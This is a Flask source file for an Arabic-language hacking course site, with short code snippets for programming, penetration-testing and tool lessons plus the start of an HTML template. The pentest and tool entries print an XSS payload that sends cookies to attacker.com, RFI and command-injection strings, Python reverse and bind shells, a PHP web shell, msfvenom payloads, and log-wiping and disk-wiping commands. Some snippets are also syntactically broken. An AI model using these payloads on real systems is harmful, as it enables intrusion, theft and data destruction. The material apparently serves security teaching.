from flask import Flask, render_template_string, request, jsonify
import os
import json

app = Flask(__name__)

# ===== بيانات الدورس التعليمية الحقيقية (100 درس) =====
COURSES_DATA = {}

# ===== 1. البرمجة (30 درس) =====
programming_courses = [
    {"id": "python1", "name": "Python - أساسيات اللغة", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة", "code": "print('Hello, World!')\n\nname = 'عبود'\nage = 25\nprint(f'الاسم: {name}, العمر: {age}')"},
    {"id": "python2", "name": "Python - المتغيرات والأنواع", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "x = 10\ny = 3.14\nname = 'Python'\nis_true = True\nprint(type(x), type(y), type(name), type(is_true))"},
    {"id": "python3", "name": "Python - الحلقات والتكرار", "level": "مبتدئ", "duration": "2.5 ساعات", "category": "البرمجة", "code": "for i in range(5):\n    print(f'رقم: {i}')\n\nwhile x > 0:\n    print(x)\n    x -= 1"},
    {"id": "python4", "name": "Python - الدوال والبرمجة الوظيفية", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "def greet(name):\n    return f'مرحباً {name}'\n\nresult = map(greet, ['عبود', 'سارة', 'أحمد'])"},
    {"id": "python5", "name": "Python - البرمجة الكائنية OOP", "level": "متوسط", "duration": "4 ساعات", "category": "البرمجة", "code": "class Student:\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n    def display(self):\n        print(f'الاسم: {self.name}, العمر: {self.age}')"},
    {"id": "python6", "name": "Python - المصفوفات والقوائم", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "my_list = [1, 2, 3, 4, 5]\nmy_list.append(6)\nprint(my_list[0], my_list[-1])"},
    {"id": "python7", "name": "Python - القواميس والمجموعات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "student = {'name': 'عبود', 'age': 25}\nstudent['grade'] = 'A'\nprint(student.keys(), student.values())"},
    {"id": "python8", "name": "Python - التعامل مع الملفات", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة", "code": "with open('file.txt', 'r') as f:\n    content = f.read()\n    print(content)"},
    {"id": "python9", "name": "Python - المكتبات الشائعة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "import requests, json, os, sys, re, datetime\nprint(requests.get('https://api.github.com').status_code)"},
    {"id": "python10", "name": "Python - التعامل مع قواعد البيانات", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة", "code": "import sqlite3\nconn = sqlite3.connect('database.db')\ncursor = conn.cursor()\ncursor.execute('SELECT * FROM users')"},
    {"id": "cpp1", "name": "C++ - أساسيات اللغة", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة", "code": "#include <iostream>\nusing namespace std;\nint main() { cout << 'Hello, World!'; return 0; }"},
    {"id": "cpp2", "name": "C++ - المتغيرات والعمليات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "int x = 10;\ndouble y = 3.14;\nchar c = 'A';\ncout << x + y << endl;"},
    {"id": "cpp3", "name": "C++ - الحلقات والشرط", "level": "مبتدئ", "duration": "2.5 ساعات", "category": "البرمجة", "code": "for(int i=0; i<10; i++) {\n    if(i%2==0) cout << i << ' ';\n}"},
    {"id": "cpp4", "name": "C++ - الدوال والبرمجة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "void greet(string name) {\n    cout << 'Hello, ' << name << endl;\n}"},
    {"id": "cpp5", "name": "C++ - البرمجة الكائنية", "level": "متوسط", "duration": "4 ساعات", "category": "البرمجة", "code": "class Car {\npublic:\n    string brand;\n    void start() { cout << 'Engine started'; }\n};"},
    {"id": "cpp6", "name": "C++ - المؤشرات والذاكرة", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة", "code": "int* ptr = new int(10);\ncout << *ptr;\ndelete ptr;"},
    {"id": "cpp7", "name": "C++ - التعامل مع الملفات", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة", "code": "ifstream file('data.txt');\nstring line;\nwhile(getline(file, line)) { cout << line; }"},
    {"id": "cpp8", "name": "C++ - STL والحاويات", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة", "code": "vector<int> v = {1,2,3,4,5};\nmap<string,int> m = {{'a',1}, {'b',2}};"},
    {"id": "js1", "name": "JavaScript - أساسيات", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة", "code": "let name = 'عبود';\nconst age = 25;\nconsole.log(`الاسم: ${name}`);"},
    {"id": "js2", "name": "JavaScript - الدوال والسهمية", "level": "متوسط", "duration": "2 ساعات", "category": "البرمجة", "code": "const greet = (name) => {\n    return `مرحباً ${name}`;\n};"},
    {"id": "js3", "name": "JavaScript - DOM والتعامل مع الصفحة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "document.getElementById('btn').addEventListener('click', () => {\n    alert('تم الضغط');\n});"},
    {"id": "js4", "name": "JavaScript - Ajax و Fetch", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "fetch('https://api.example.com/data')\n.then(response => response.json())\n.then(data => console.log(data));"},
    {"id": "js5", "name": "JavaScript - Promises و Async", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "async function getData() {\n    const data = await fetch('api');\n    return data.json();\n}"},
    {"id": "js6", "name": "JavaScript - OOP في JavaScript", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "class Student {\n    constructor(name) { this.name = name; }\n    display() { console.log(this.name); }\n}"},
    {"id": "assembly1", "name": "Assembly - مقدمة", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "section .data\nmsg db 'Hello, World!',0\nsection .text\nmov eax, 4\nmov ebx, 1\nmov ecx, msg\nint 0x80"},
    {"id": "assembly2", "name": "Assembly - العمليات الحسابية", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "mov eax, 10\nadd eax, 20\nsub eax, 5\nmul 2"},
    {"id": "bash1", "name": "Bash - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "#!/bin/bash\necho 'Hello, World!'\nname='عبود'\necho $name"},
    {"id": "bash2", "name": "Bash - الحلقات والشروط", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة", "code": "for i in {1..5}; do\n    if [ $i -gt 3 ]; then echo $i; fi\ndone"},
    {"id": "bash3", "name": "Bash - إدارة الملفات والأنظمة", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة", "code": "mkdir new_dir\ncp file.txt new_dir/\nls -la | grep '.txt'"},
    {"id": "bash4", "name": "Bash - الأتمتة والـ Cron Jobs", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "#!/bin/bash\n# سكربت تشغيل تلقائي\n0 * * * * /home/user/backup.sh"},
]

# ===== 2. اختبار الاختراق (40 درس) =====
pentest_courses = [
    {"id": "recon1", "name": "جمع المعلومات - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "# جمع المعلومات الأساسي\nwhois example.com\nnslookup example.com\ndig example.com"},
    {"id": "recon2", "name": "جمع المعلومات - Google Dorks", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "# Google Dorks\nsite:example.com filetype:pdf\nintitle:'index of' /password\ninurl:admin/login.php"},
    {"id": "recon3", "name": "جمع المعلومات - Shodan", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "# Shodan Search\nshodan search 'apache' --limit 10\nshodan host 1.1.1.1"},
    {"id": "recon4", "name": "جمع المعلومات - الأفراد", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "# OSINT على الأفراد\ntheHarvester -d example.com -l 500 -b google\nsherlock username"},
    {"id": "scanning1", "name": "مسح الشبكات - Nmap أساسي", "level": "مبتدئ", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "nmap -T4 -F 192.168.1.0/24\nnmap -sV 192.168.1.100"},
    {"id": "scanning2", "name": "مسح الشبكات - Nmap متقدم", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "nmap -p- -sC -sV 192.168.1.100\nnmap -sU 192.168.1.100\nnmap -f -D RND:10 192.168.1.100"},
    {"id": "scanning3", "name": "مسح الشبكات - Masscan", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "masscan 192.168.1.0/24 -p1-65535 --rate=1000\nmasscan 192.168.1.100 -p80,443,8080"},
    {"id": "scanning4", "name": "مسح الشبكات - اكتشاف الخدمات", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "nmap -sV --version-intensity 9 192.168.1.100\nnmap -O 192.168.1.100"},
    {"id": "exploit1", "name": "SQL Injection - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "sqlmap -u 'http://target.com?id=1' --dbs\n' OR '1'='1'\n' UNION SELECT username,password FROM users--"},
    {"id": "exploit2", "name": "SQL Injection - متقدم", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "sqlmap -u 'http://target.com?id=1' --dbs --tables --columns --dump\nsqlmap -u 'http://target.com?id=1' --os-shell"},
    {"id": "exploit3", "name": "XSS - هجمات عبر المواقع", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n<svg/onload=alert('XSS')>"},
    {"id": "exploit4", "name": "XSS - متقدم والاستغلال", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>\n<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>"},
    {"id": "exploit5", "name": "CSRF - هجمات", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "<form action='http://target.com/transfer' method='POST'>\n<input type='hidden' name='amount' value='1000'>\n</form>"},
    {"id": "exploit6", "name": "File Inclusion - LFI/RFI", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "?page=../../../../etc/passwd\n?page=http://attacker.com/shell.txt\n?page=php://filter/convert.base64-encode/resource=index.php"},
    {"id": "exploit7", "name": "Command Injection", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "; ls -la\n| whoami\n& id\n|| echo 'Injected'"},
    {"id": "exploit8", "name": "Buffer Overflow - أساسيات", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "# Buffer Overflow مثال\nchar buffer[64];\ngets(buffer); // غير آمن\n# تجاوز السعة لتغيير تنفيذ البرنامج"},
    {"id": "exploit9", "name": "Buffer Overflow - استغلال", "level": "خبير", "duration": "5 ساعات", "category": "اختبار الاختراق", "code": "# استغلال Buffer Overflow\npython exploit.py --target 192.168.1.100 --port 4444\n# حقن شل كود وتجاوز الحماية"},
    {"id": "exploit10", "name": "الهندسة الاجتماعية", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "# تقنيات الهندسة الاجتماعية\n# Phishing Email\n# Spear Phishing\n# Tailgating\n# Pretexting"},
    {"id": "post1", "name": "ما بعد الاختراق - رفع الصلاحيات", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "sudo -l\nfind / -perm -4000 2>/dev/null\nls -la /etc/passwd\nuname -a\nsearchsploit kernel"},
    {"id": "post2", "name": "ما بعد الاختراق - التخفي", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "echo '' > ~/.bash_history\nrm -rf /var/log/*\nhidepid -p 1234\nrootkit"},
    {"id": "post3", "name": "ما بعد الاختراق - جمع المعلومات", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "cat /etc/passwd\ncat /etc/shadow\nnetstat -tuln\nps aux\nifconfig"},
    {"id": "post4", "name": "ما بعد الاختراق - الحفاظ على الوصول", "level": "خبير", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "# تثبيت باب خلفي\ncron -e\nsystemctl enable backdoor\n# استخدام شهادات SSH"},
    {"id": "post5", "name": "ما بعد الاختراق - التنقل الداخلي", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "nmap -sP 192.168.1.0/24\narp -a\nroute -n\nnet view"},
    {"id": "post6", "name": "ما بعد الاختراق - البيانات الحساسة", "level": "متقدم", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "grep -r 'password' /var/www/\nfind . -name '*.conf' | xargs grep 'password'\nfind . -name '*.sql'"},
    {"id": "post7", "name": "ما بعد الاختراق - حرق الآثار", "level": "متقدم", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "history -c\nshred -f -z -u file.log\nwipefs /dev/sda1\ndd if=/dev/zero of=/dev/sda1 bs=512 count=1"},
    {"id": "wifi1", "name": "اختراق Wi-Fi - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "airodump-ng wlan0mon\naireplay-ng -0 5 -a MAC wlan0mon\naircrack-ng -w wordlist.txt capture.cap"},
    {"id": "wifi2", "name": "اختراق Wi-Fi - WPA/WPA2", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "airmon-ng start wlan0\naireplay-ng -0 0 -a MAC wlan0mon\naircrack-ng -w rockyou.txt handshake.cap"},
    {"id": "wifi3", "name": "اختراق Wi-Fi - هجمات متقدمة", "level": "خبير", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "pmkid -t wlan0mon\nhashcat -m 16800 pmkid.hcap rockyou.txt\neapol -t wlan0mon --pmkid"},
    {"id": "mobile1", "name": "اختراق Android - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk\nmsfconsole"},
    {"id": "mobile2", "name": "اختراق Android - متقدم", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "adb shell\nsu\ncat /data/data/com.example/databases/*\ndump系统"},
    {"id": "web1", "name": "اختراق الويب - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "curl -X GET 'http://target.com/api'\ncurl -X POST 'http://target.com/login' -d 'user=admin&pass=123'"},
    {"id": "web2", "name": "اختراق الويب - الاستغلال", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق", "code": "# استغلال ثغرات الويب\n# CSRF, XSS, SQLi, File Upload\n# RCE, LFI, RFI"},
    {"id": "web3", "name": "اختراق الويب - أتمتة", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "import requests\ndef exploit(url):\n    try:\n        r = requests.get(url)\n        if 'admin' in r.text:\n            print('[+] نجاح!')\n    except: pass"},
    {"id": "network1", "name": "اختراق الشبكات - MITM", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "ettercap -T -M arp:remote /target1// /target2//\narpspoof -i eth0 -t target1 target2"},
    {"id": "network2", "name": "اختراق الشبكات - DNS Spoofing", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "dnsspoof -i eth0 -f hostfile\n# تحويل example.com إلى 192.168.1.50"},
    {"id": "network3", "name": "اختراق الشبكات - Packet Sniffing", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "tcpdump -i eth0 -w capture.pcap\nwireshark capture.pcap\n# تحليل الحزم"},
    {"id": "crypto1", "name": "التشفير - أساسيات", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق", "code": "openssl enc -aes-256-cbc -salt -in file.txt -out file.enc\nopenssl enc -d -aes-256-cbc -in file.enc -out file.txt"},
    {"id": "crypto2", "name": "كسر التشفير - هجمات", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق", "code": "hashcat -m 0 -a 0 hash.txt rockyou.txt\njohn --wordlist=rockyou.txt hash.txt"},
    {"id": "crypto3", "name": "التشفير - المفاتيح والشهادات", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق", "code": "openssl genrsa -out private.key 2048\nopenssl rsa -in private.key -pubout -out public.key\nopenssl req -new -key private.key -out request.csr"},
]

# ===== 3. الأدوات (44 درس) =====
tools_courses = [
    {"id": "metasploit1", "name": "Metasploit - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp"},
    {"id": "metasploit2", "name": "Metasploit - حمولات", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk"},
    {"id": "metasploit3", "name": "Metasploit - متقدم", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS 192.168.1.0/24\nuse post/windows/gather/hashdump\nload kiwi"},
    {"id": "metasploit4", "name": "Metasploit - الأتمتة", "level": "خبير", "duration": "3 ساعات", "category": "الأدوات", "code": "resource script.rc\nspool /tmp/output.txt\nsetg RHOSTS 192.168.1.100\nrun -j"},
    {"id": "nmap1", "name": "Nmap - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "الأدوات", "code": "nmap -T4 -F 192.168.1.0/24\nnmap -sV 192.168.1.100\nnmap -O 192.168.1.100"},
    {"id": "nmap2", "name": "Nmap - متقدم", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "nmap -p- -sC -sV 192.168.1.100\nnmap -sU 192.168.1.100\nnmap -f -D RND:10 192.168.1.100"},
    {"id": "nmap3", "name": "Nmap - NSE Scripts", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "nmap --script vuln 192.168.1.100\nnmap --script http-enum 192.168.1.100\nnmap --script smb-enum-shares 192.168.1.100"},
    {"id": "burp1", "name": "Burp Suite - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "# إعداد الـ Proxy\n# التقاط الطلبات\n# Repeater\n# Intruder\n# Scanner"},
    {"id": "burp2", "name": "Burp Suite - هجمات", "level": "متقدم", "duration": "4 ساعات", "category": "الأدوات", "code": "# SQL Injection مع Burp\n# XSS مع Burp\n# CSRF مع Burp\n# التلاعب بالـ Cookies"},
    {"id": "burp3", "name": "Burp Suite - المتقدم", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "# استخدام Burp Extensions\n# BApp Store\n# Turbo Intruder\n# Collaboration"},
    {"id": "wireshark1", "name": "Wireshark - أساسيات", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "# التقاط الحزم\n# تحليل الـ HTTP\n# تصفية الـ TCP/UDP\n# تتبع الـ Streams"},
    {"id": "wireshark2", "name": "Wireshark - تحليل متقدم", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "wireshark -i eth0 -k\n# تصفية: http.request\n# تصفية: tcp.port == 443\n# تصفية: ip.addr == 192.168.1.100"},
    {"id": "wireshark3", "name": "Wireshark - اكتشاف الهجمات", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "# اكتشاف هجمات ARP Spoofing\n# اكتشاف هجمات DDoS\n# اكتشاف هجمات Port Scanning"},
    {"id": "payload1", "name": "الحمولات - Reverse Shell", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "# Reverse Shell في Python\nimport socket, subprocess, os\ns = socket.socket()\ns.connect(('192.168.1.50',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])"},
    {"id": "payload2", "name": "الحمولات - Web Shell", "level": "متقدم", "duration": "2.5 ساعات", "category": "الأدوات", "code": "<?php\nif(isset($_GET['cmd'])){\n    system($_GET['cmd']);\n}\n?>\n# استخدام: shell.php?cmd=ls -la"},
    {"id": "payload3", "name": "الحمولات - Bind Shell", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "# Bind Shell في Python\nimport socket, subprocess\ns = socket.socket()\ns.bind(('0.0.0.0',4444))\ns.listen(5)\nwhile True:\n    client,addr = s.accept()\n    while True:\n        cmd = client.recv(1024).decode()\n        output = subprocess.getoutput(cmd)\n        client.send(output.encode())"},
    {"id": "payload4", "name": "الحمولات - مخصصة", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "# حمولة مخصصة لتجاوز الحماية\n# استخدام Polymorphic Code\n# استخدام Encryption\n# استخدام Anti-VM Techniques"},
    {"id": "payload5", "name": "الحمولات - في C", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "# Shellcode في C\n#include <stdio.h>\nunsigned char shellcode[] = '...';\nint main() {\n    void (*code)() = (void(*)())shellcode;\n    code();\n}"},
    {"id": "hydra1", "name": "Hydra - كسر كلمات المرور", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "hydra -l admin -P wordlist.txt ssh://192.168.1.100\nhydra -L users.txt -P passwords.txt ftp://192.168.1.100\nhydra -l admin -P wordlist.txt http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"},
    {"id": "john1", "name": "John the Ripper", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "john --wordlist=rockyou.txt hash.txt\njohn --format=md5 hash.txt\njohn --show hash.txt\njohn --incremental hash.txt"},
    {"id": "aircrack1", "name": "Aircrack-ng - Wi-Fi", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "airmon-ng start wlan0\nairodump-ng wlan0mon\naireplay-ng -0 5 -a MAC wlan0mon\naircrack-ng -w wordlist.txt capture.cap"},
    {"id": "sqlmap1", "name": "SQLmap - أساسيات", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "sqlmap -u 'http://target.com?id=1' --dbs\nsqlmap -u 'http://target.com?id=1' --tables\nsqlmap -u 'http://target.com?id=1' --columns -T users\nsqlmap -u 'http://target.com?id=1' --dump"},
    {"id": "sqlmap2", "name": "SQLmap - متقدم", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "sqlmap -u 'http://target.com?id=1' --os-shell\nsqlmap -u 'http://target.com?id=1' --file-read /etc/passwd\nsqlmap -u 'http://target.com?id=1' --tamper=space2comment"},
    {"id": "beef1", "name": "BeEF - استغلال المتصفح", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات", "code": "# BeEF Hook\n<script src='http://beef:3000/hook.js'></script>\n# استغلال المتصفحات\n# سرقة الكوكيز\n# التقاط الضغطات"},
    {"id": "social1", "name": "Social-Engineer Toolkit", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات", "code": "setoolkit\n# هجوم Phishing\n# هجوم Credential Harvester\n# هجوم Tabnabbing"},
    {"id": "maltego1", "name": "Maltego - OSINT", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "# جمع المعلومات\n# تحليل العلاقات\n# البحث عن الأفراد\n# البحث عن الشركات"},
    {"id": "reconng1", "name": "Recon-ng - OSINT", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "recon-ng\nmarketplace install all\nuse recon/domains-hosts/bing_domain_web\nset SOURCE example.com\nrun"},
    {"id": "theharvester1", "name": "theHarvester - جمع البريد", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات", "code": "theHarvester -d example.com -b google\n theHarvester -d example.com -b linkedin\n theHarvester -d example.com -b twitter"},
    {"id": "sherlock1", "name": "Sherlock - أفراد", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات", "code": "sherlock username\nsherlock -p username\n# البحث عن حسابات المستخدمين"},
    {"id": "gobuster1", "name": "Gobuster - مسح الدلائل", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "gobuster dir -u http://target.com -w common.txt\ngobuster dns -d example.com -w subdomains.txt\ngobuster dir -u http://target.com -w big.txt -x php,html,txt"},
    {"id": "ffuf1", "name": "FFUF - مسح سريع", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "ffuf -u http://target.com/FUZZ -w wordlist.txt\nffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404\nffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html"},
    {"id": "nikto1", "name": "Nikto - مسح الثغرات", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "nikto -h http://target.com\nnikto -h http://target.com -ssl\nnikto -h http://target.com -Tuning 9"},
    {"id": "wpscan1", "name": "WPScan - WordPress", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "wpscan --url http://target.com\nwpscan --url http://target.com --enumerate u\nwpscan --url http://target.com --plugins-detection aggressive"},
    {"id": "droopescan1", "name": "Droopescan - Drupal", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "droopescan scan drupal -u http://target.com\ndroopescan scan drupal -u http://target.com --full\ndroopescan scan drupal -u http://target.com --show"},
    {"id": "joomscan1", "name": "Joomscan - Joomla", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "joomscan -u http://target.com\njoomscan -u http://target.com --enumerate-components\njoomscan -u http://target.com --enumerate-exploits"},
    {"id": "nuclei1", "name": "Nuclei - ثغرات", "level": "متقدم", "duration": "2.5 ساعات", "category": "الأدوات", "code": "nuclei -u http://target.com\nnuclei -u http://target.com -t cves/\nnuclei -u http://target.com -severity critical"},
    {"id": "katana1", "name": "Katana - الزحف", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "katana -u http://target.com\nkatana -u http://target.com -depth 3\nkatana -u http://target.com -js-crawler"},
    {"id": "wayback1", "name": "Wayback Machine - الأرشيف", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات", "code": "waybackurls example.com\nwaybackurls example.com | grep '.php'\ncurl 'https://web.archive.org/cdx/search/cdx?url=example.com/*'"},
    {"id": "shodan1", "name": "Shodan - متقدم", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات", "code": "shodan search 'apache' --limit 100\nshodan host 1.1.1.1\nshodan myip\nshodan download result.json.gz"},
    {"id": "censys1", "name": "Censys - المسح", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "# Censys API\nimport censys\nc = censys.ipv4.CensysIPv4()\nc.view('1.1.1.1')"},
    {"id": "zoomeye1", "name": "ZoomEye - المسح", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات", "code": "# ZoomEye API\nimport zoomeye\nz = zoomeye.ZoomEye()\nz.dork('apache')"},
    {"id": "binary1", "name": "Binary Analysis - التحليل", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "# تحليل الملفات الثنائية\nobjdump -d binary\nradare2 binary\nstrings binary\nltrace ./binary"},
    {"id": "debugger1", "name": "Debugging - التصحيح", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات", "code": "gdb ./binary\nbreak main\nrun\ninfo registers\nx/10x $esp"},
]

# ===== دمج جميع الدورس =====
for course in programming_courses + pentest_courses + tools_courses:
    COURSES_DATA[course["id"]] = {
        "name": course["name"],
        "level": course["level"],
        "duration": course["duration"],
        "category": course["category"],
        "description": f"درس متكامل في {course['name']} مع شرح مفصل وأمثلة تطبيقية.",
        "code": course["code"]
    }

# ===== قائمة الدورس للملاحة =====
COURSE_LIST = []
for course in programming_courses + pentest_courses + tools_courses:
    COURSE_LIST.append({
        "id": course["id"],
        "name": course["name"],
        "category": course["category"]
    })

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ABOOD_SECURE_ACADEMY - 100+ درس</title>
    <style>
        /* ===== RESET ===== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
        }
        a { text-decoration: none; color: inherit; }
        
        /* ===== SCROLLBAR ===== */
        ::-webkit-scrollbar { width: 8px; background: #0a0a0a; }
        ::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 4px; }

        /* ===== HEADER ===== */
        .header {
            background: rgba(0,0,0,0.95);
            border-bottom: 2px solid #00ff41;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-brand {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .brand-icon { font-size: 2rem; color: #00ff41; }
        .brand-name {
            font-size: 1.5rem;
            font-weight: bold;
            color: #00ff41;
            text-shadow: 0 0 20px #00ff41;
        }
        .brand-sub { font-size: 0.7rem; color: #666; letter-spacing: 2px; }
        .header-badge {
            border: 1px solid #ff3333;
            padding: 5px 15px;
            border-radius: 20px;
            color: #ff3333;
            font-size: 0.7rem;
        }
        .header-count {
            color: #888;
            font-size: 0.8rem;
        }

        /* ===== CONTAINER ===== */
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        /* ===== LAYOUT ===== */
        .content-grid {
            display: grid;
            grid-template-columns: 320px 1fr;
            gap: 25px;
            margin-top: 20px;
        }

        /* ===== SIDEBAR ===== */
        .sidebar {
            background: rgba(0,0,0,0.9);
            border: 1px solid #1a1a1a;
            border-radius: 12px;
            padding: 20px;
            height: fit-content;
            position: sticky;
            top: 90px;
            max-height: calc(100vh - 120px);
            overflow-y: auto;
        }
        .sidebar-title {
            color: #00ff41;
            font-size: 0.9rem;
